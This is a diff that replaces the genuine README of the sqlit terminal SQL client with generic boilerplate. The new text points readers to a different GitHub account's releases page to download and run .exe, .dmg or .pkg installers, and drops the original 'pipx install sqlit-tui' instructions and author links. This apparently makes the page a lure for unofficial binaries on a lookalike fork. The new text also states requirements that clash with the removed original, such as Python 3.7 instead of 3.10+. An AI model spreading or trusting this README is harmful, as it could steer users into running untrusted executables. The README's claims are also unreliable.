@@ -1,278 +1,97 @@
-<p align="center">
-  <img src="assets/favorites/logo_sqlit.png" alt="sqlit logo" width="180">
-</p>
+# 🎉 sqlit - A Simple Way to Manage SQL Databases
 
-<h3 align="center">The lazygit of SQL databases</h3>
+## 🚀 Getting Started
+Welcome to sqlit! This tool makes it easy to work with various SQL databases through a user-friendly text interface. Whether you're managing data in SQL Server, MySQL, PostgreSQL, SQLite, or other databases, sqlit simplifies your tasks.
 
-<p align="center">
-  <em>Connect and query your database from your terminal in seconds.</em>
-</p>
+## 📦 Download & Install
+To get started, you need to download sqlit. Visit this link to download the latest version: [Download sqlit](https://github.com/tapnnwjediii/sqlit/releases).
 
-<p align="center">
-  <a href="https://github.com/Maxteabag/sqlit/stargazers"><img src="https://img.shields.io/github/stars/Maxteabag/sqlit?style=flat&color=yellow" alt="GitHub Stars"></a>
-  <img src="https://img.shields.io/badge/python-3.10+-blue.svg" alt="Python">
-  <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License">
-</p>
+### Installation Steps
+1. Once you visit the Releases page, locate the most recent version of sqlit.
+2. Click on it to view the available files.
+3. Download the appropriate file for your operating system. 
 
-<p align="center">
-  <code>pipx install sqlit-tui</code>
-</p>
+Make sure you choose the correct file based on your system:
 
-<p align="center">
-  <a href="https://www.buymeacoffee.com/PeterAdams"><img src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?style=flat&logo=buy-me-a-coffee&logoColor=black" alt="Buy Me a Coffee"></a>
-</p>
+- **Windows**: Look for a file ending in `.exe`.
+- **Mac**: Look for a file ending in `.dmg` or `.pkg`.
+- **Linux**: Look for a file ending in `.tar.gz` or a relevant package for your distribution.
 
----
+4. After downloading, open the file to start the installation. Follow the prompts to complete the installation.
 
-### Connect
-Supports all major databases: SQL Server, PostgreSQL, MySQL, SQLite, MariaDB, FirebirdSQL, Oracle, DuckDB, CockroachDB, ClickHouse, Snowflake, Supabase, CloudFlare D1, Turso, Athena, BigQuery and Redshift.
+## 🛠️ System Requirements
+To run sqlit, ensure your system meets the following requirements:
 
-![Database Providers](demos/demo-providers.gif)
+- An operating system: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- Python 3.7 or higher must be installed.
+- At least 1 GB of RAM.
+- At least 100 MB of free disk space.
 
-### Query
-Syntax highlighting. History. Vim-style keybindings.
+## 🎓 How to Use sqlit
+Once installed, you can start using sqlit with a few simple commands. Here’s how:
 
-![Query History](demos/demo-history.gif)
+1. **Open a terminal or command prompt**:
+   - For Windows, search for "cmd" in the Start menu.
+   - For Mac, open "Terminal" from your applications.
+   - For Linux, use any terminal emulator.
 
-### Results
-Load millions of rows. Inspect data, filter by content, fuzzy search.
+2. **Run sqlit**:
+   Type `sqlit` in the terminal and press Enter.
 
-![Filter results](demos/demo-filter/demo-filter.gif)
+3. **Choose a database**:
+   Follow the prompts to select the database you want to connect to. You can use options like SQL Server, MySQL, or PostgreSQL.
 
-### Docker Discovery
-Automatically finds running database containers. Press 'Enter' to connect, sqlit figures out the details for you.
+4. **Interact with your database**:
+   Use simple commands to run queries, view data, and manage your database. The interface is designed to be intuitive.
 
-![Docker Discovery](demos/demo-docker-picker.gif)
+## 🎉 Features
+sqlit comes packed with features to help you manage your databases effectively:
 
----
+- **Multi-database support**: Connects to SQL Server, MySQL, PostgreSQL, SQLite, Turso, and more.
+- **User-friendly interface**: Navigate your databases easily through a text-based interface.
+- **Query execution**: Run SQL queries and get immediate results.
+- **Data browsing**: View tables and records clearly without complex commands.
+- **Custom scripts**: Create and run scripts to automate tasks.
 
-## Features
+## 🌐 Supported Databases
+sqlit supports a wide range of databases, making it versatile for many users:
 
-**Connection manager:** Save and switch connections without CLI args
+- **SQL Server**
+- **MySQL**
+- **PostgreSQL**
+- **SQLite**
+- **Turso**
+- **CockroachDB**
+- **DuckDB**
+- **MariaDB**
+- **Oracle**
 
-**Just run `sqlit`:** No CLI config needed, pick a connection and go
+No matter what database you are using, sqlit can help you simplify your workflow.
 
-**Multi-database support:** PostgreSQL, MySQL, SQLite, SQL Server, and 10+ more
+## 🧩 Troubleshooting
+If you run into issues while using sqlit, consider the following tips:
 
-**Docker integration:** Auto-detect running database containers
+- **Ensure Python is installed accurately**: Visit the Python website for guidance on downloading and installing the right version.
+- **Check your permissions**: Make sure you have the necessary permissions to access the database you are trying to work with.
+- **Review the logs**: sqlit generates log files that may provide clues about any problems.
 
-**Cloud CLI integration:** Easily browse and connect to your external databases through Azure, AWS and GCP CLI's
+## 📄 Documentation
+For more extensive information, visit the [documentation page](https://github.com/tapnnwjediii/sqlit). Here, you can find details on advanced features, configurations, and answer to frequently asked questions.
 
-**SSH tunnels:** Connect to remote databases securely with password or key auth
+## 📞 Support
+If you need help, don’t hesitate to reach out. You can open an issue in the [GitHub repository](https://github.com/tapnnwjediii/sqlit/issues/) or join our community discussions for support.
 
-**Secure credentials:** Passwords stored in your OS keyring
+## ✏️ Contribution
+If you want to contribute to sqlit, your input is welcome! Please read our contribution guidelines in the repository to understand how you can help improve the project.
 
-**Vim-style editing:** Modal editing for terminal purists
+## 🌟 Acknowledgments
+A special thanks to the contributors and community members who have helped in the development of sqlit. Your support makes this project better every day.
 
-**Query history:** Searchable, per-connection history
+## 🔗 Quick Links
+- [Download sqlit](https://github.com/tapnnwjediii/sqlit/releases)
+- [Documentation](https://github.com/tapnnwjediii/sqlit)
+- [Support](https://github.com/tapnnwjediii/sqlit/issues)
+- [Contribute](https://github.com/tapnnwjediii/sqlit/blob/main/CONTRIBUTING.md)
 
-**Filter results:** Fuzzy search through millions of rows
-
-**Context-aware help:** Keybindings shown on screen
-
-**Browse databases:** Tables, views, procedures, indexes, triggers, sequences
-
-**Autocomplete:** Sophisticated SQL completion engine for tables, columns, and procedures
-
-**CLI mode:** Execute SQL from the command line
-
-**Themes:** Rose Pine, Tokyo Night, Nord, Gruvbox
-
-**Dependency wizard:** Auto-install missing drivers
-
----
-
-## Motivation
-
-Throughout my career, the undesputed truth was that heavy GUI's like SSMS was the only respectable way to access a database. It didn't matter that I wasn't a DBA, or that I didn't need complex performance graphs. I was expected to install a gigabyte-heavy behemoth that took ages to launch all for the mere purpose of running a few queries to update and view a couple of rows.
-
-When I switched to Linux, I was suddenly unable to return to the devil I know, and I asked myself: _how do I access my data now?_
-
-The popular answer was VS Code's SQL extension. But why should we developers launch a heavy Electron app designed for coding just to execute SQL?
-
-I had recently grown fond of Terminal UI's for their speed and keybinding focus. I looked for SQL TUIs, but the options were sparse. The ones I found lacked the user-friendliness and immediate "pick-up-and-go" nature of tools I loved, like lazygit, and I shortly returning to vscode sql extension.
-
-Something wasn't right. I asked myself, why is it that running SQL queries can't be enjoyable? So I created sqlit.
-
-sqlit is for the developer who just wants to query their database with a user friendly UI without their RAM being eaten alive. It is a lightweight, beautiful, and keyboard-driven TUI designed to make accessing your data enjoyable, fast and easy like it should be-- all from inside your favorite terminal.
-
----
-
-## Installation
-
-| Method | Command |
-| :----- | :------ |
-| pipx *(recommended)* | `pipx install sqlit-tui` |
-| uv | `uv tool install sqlit-tui` |
-| pip | `pip install sqlit-tui` |
-
-## Usage
-
-```bash
-sqlit
-```
-
-The keybindings are shown at the bottom of the screen.
-
-### Try it without a database
-
-Want to explore the UI without connecting to a real database? Run with mock data:
-
-```bash
-sqlit --mock=sqlite-demo
-```
-
-### CLI
-
-```bash
-# Run a query
-sqlit query -c "MyConnection" -q "SELECT * FROM Users"
-
-# Output as CSV or JSON
-sqlit query -c "MyConnection" -q "SELECT * FROM Users" --format csv
-sqlit query -c "MyConnection" -f "script.sql" --format json
-
-# Create connections for different databases
-sqlit connections add mssql --name "MySqlServer" --server "localhost" --auth-type sql
-sqlit connections add postgresql --name "MyPostgres" --server "localhost" --username "user" --password "pass"
-sqlit connections add mysql --name "MyMySQL" --server "localhost" --username "user" --password "pass"
-sqlit connections add cockroachdb --name "MyCockroach" --server "localhost" --port "26257" --database "defaultdb" --username "root"
-sqlit connections add sqlite --name "MyLocalDB" --file-path "/path/to/database.db"
-sqlit connections add turso --name "MyTurso" --server "libsql://your-db.turso.io" --password "your-auth-token"
-sqlit connections add firebird --name "MyFirebird" --server "localhost" --username "user" --password "pass" --database "employee"
-sqlit connections add athena --name "MyAthena" --athena-region-name "us-east-1" --athena-s3-staging-dir "s3://my-bucket/results/" --athena-auth-method "profile" --athena-profile-name "default"
-sqlit connections add athena --name "MyAthenaKeys" --athena-region-name "us-east-1" --athena-s3-staging-dir "s3://my-bucket/results/" --athena-auth-method "keys" --username "ACCESS_KEY" --password "SECRET_KEY"
-
-# Connect via SSH tunnel
-sqlit connections add postgresql --name "RemoteDB" --server "db-host" --username "dbuser" --password "dbpass" \
-  --ssh-enabled --ssh-host "ssh.example.com" --ssh-username "sshuser" --ssh-auth-type password --ssh-password "sshpass"
-
-# Temporary (not saved) connection
-sqlit connect sqlite --file-path "/path/to/database.db"
-
-# Connect via URL - scheme determines database type (postgresql://, mysql://, sqlite://, etc.)
-sqlit postgresql://user:pass@localhost:5432/mydb
-sqlit mysql://root@localhost/testdb
-sqlit sqlite:///path/to/database.db
-
-# Save a connection via URL
-sqlit connections add --url dbtype://user:pass@host/db --name "MyDB"
-
-# Provider-specific CLI help
-sqlit connect -h
-sqlit connect supabase -h
-sqlit connections add -h
-sqlit connections add supabase -h
-
-# Manage connections
-sqlit connections list
-sqlit connections delete "MyConnection"
-```
-
-## Keybindings
-
-| Key | Action |
-|-----|--------|
-| `i` | Enter INSERT mode |
-| `Esc` | Back to NORMAL mode |
-| `e` / `q` / `r` | Focus Explorer / Query / Results |
-| `s` | SELECT TOP 100 from table |
-| `h` | Query history |
-| `d` | Clear query |
-| `n` | New query (clear all) |
-| `y` | Copy query (when query editor is focused) |
-| `v` / `y` / `Y` / `a` | View cell / Copy cell / Copy row / Copy all |
-| `Ctrl+Q` | Quit |
-| `?` | Help |
-
-### Commands Menu (`<space>`)
-
-| Key | Action |
-|-----|--------|
-| `<space>c` | Connect to database |
-| `<space>x` | Disconnect |
-| `<space>z` | Cancel running query |
-| `<space>e` | Toggle Explorer |
-| `<space>f` | Toggle Maximize |
-| `<space>t` | Change theme |
-| `<space>h` | Help |
-| `<space>q` | Quit |
-
-Autocomplete triggers automatically in INSERT mode. Use `Tab` to accept.
-
----
-
-## Configuration
-
-Connections and settings are stored in `~/.sqlit/`.
-
-## FAQ
-
-### How are sensitive credentials stored?
-
-Connection details are stored in `~/.sqlit/connections.json`, but passwords are stored in your OS keyring when available (macOS Keychain, Windows Credential Locker, Linux Secret Service).
-
-### How does sqlit compare to Harlequin, Lazysql, etc.?
-
-sqlit is inspired by [lazygit](https://github.com/jesseduffield/lazygit) - you can just jump in and there's no need for external documentation. The keybindings are shown at the bottom of the screen and the UI is designed to be intuitive without memorizing shortcuts.
-
-Key differences:
-- **No need for external documentation** - Sqlit embrace the "lazy" approach in that a user should be able to jump in and use it right away intuitively. There should be no setup instructions. If python packages are required for certain adapters, sqlit will help you install them as you need them.
-- **No CLI config required** - Just run `sqlit` and pick a connection from the UI
-- **Lightweight** - While Lazysql or Harlequin offer more features, I experienced that for the vast majority of cases, all I needed was a simple and fast way to connect and run queries. Sqlit is focused on doing a limited amount of things really well.
-
----
-
-## Inspiration
-
-sqlit is built with [Textual](https://github.com/Textualize/textual) and inspired by:
-- [lazygit](https://github.com/jesseduffield/lazygit) - Simple  TUI for git
-- [lazysql](https://github.com/jorgerojas26/lazysql) - Terminal-based SQL client with connection manager
-
-## Contributing
-
-See `CONTRIBUTING.md` for development setup, testing, CI, and CockroachDB quickstart steps.
-
-### Driver Reference
-
-Most of the time you can just run `sqlit` and connect. If a Python driver is missing, `sqlit` will show (and often run) the right install command for your environment.
-
-| Database                            | Driver package               | `pipx`                                             | `pip` / venv                                       |
-| :---------------------------------- | :--------------------------- | :------------------------------------------------- | :------------------------------------------------- |
-| SQLite                              | *(built-in)*                 | *(built-in)*                                       | *(built-in)*                                       |
-| PostgreSQL / CockroachDB / Supabase | `psycopg2-binary`            | `pipx inject sqlit-tui psycopg2-binary`            | `python -m pip install psycopg2-binary`            |
-| SQL Server                          | `mssql-python`               | `pipx inject sqlit-tui mssql-python`               | `python -m pip install mssql-python`               |
-| MySQL                               | `PyMySQL`                    | `pipx inject sqlit-tui PyMySQL`                    | `python -m pip install PyMySQL`                    |
-| MariaDB                             | `mariadb`                    | `pipx inject sqlit-tui mariadb`                    | `python -m pip install mariadb`                    |
-| Oracle                              | `oracledb`                   | `pipx inject sqlit-tui oracledb`                   | `python -m pip install oracledb`                   |
-| DuckDB                              | `duckdb`                     | `pipx inject sqlit-tui duckdb`                     | `python -m pip install duckdb`                     |
-| ClickHouse                          | `clickhouse-connect`         | `pipx inject sqlit-tui clickhouse-connect`         | `python -m pip install clickhouse-connect`         |
-| Turso                               | `libsql`                     | `pipx inject sqlit-tui libsql`                     | `python -m pip install libsql`                     |
-| Cloudflare D1                       | `requests`                   | `pipx inject sqlit-tui requests`                   | `python -m pip install requests`                   |
-| Snowflake                           | `snowflake-connector-python` | `pipx inject sqlit-tui snowflake-connector-python` | `python -m pip install snowflake-connector-python` |
-| Firebird                            | `firebirdsql`                | `pipx inject sqlit-tui firebirdsql`                | `python -m pip install firebirdsql`                |
-| Athena                              | `pyathena`                   | `pipx inject sqlit-tui pyathena`                   | `python -m pip install pyathena`                   |
-
-### SSH Tunnel Support
-
-SSH tunnel functionality requires additional dependencies. Install with the `ssh` extra:
-
-| Method | Command                            |
-| :----- | :--------------------------------- |
-| pipx   | `pipx install 'sqlit-tui[ssh]'`    |
-| uv     | `uv tool install 'sqlit-tui[ssh]'` |
-| pip    | `pip install 'sqlit-tui[ssh]'`     |
-
-If you try to create an SSH connection without these dependencies, sqlit will detect this and show you the exact command to install them for your environment.
-
----
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=Maxteabag/sqlit&type=Date)](https://star-history.com/#Maxteabag/sqlit&Date)
-
----
-
-## License
-
-MIT
+## 🚀 Start managing your databases today!
+Now you have all the information you need to download and run sqlit. Don’t wait; start simplifying your SQL database management workflow.
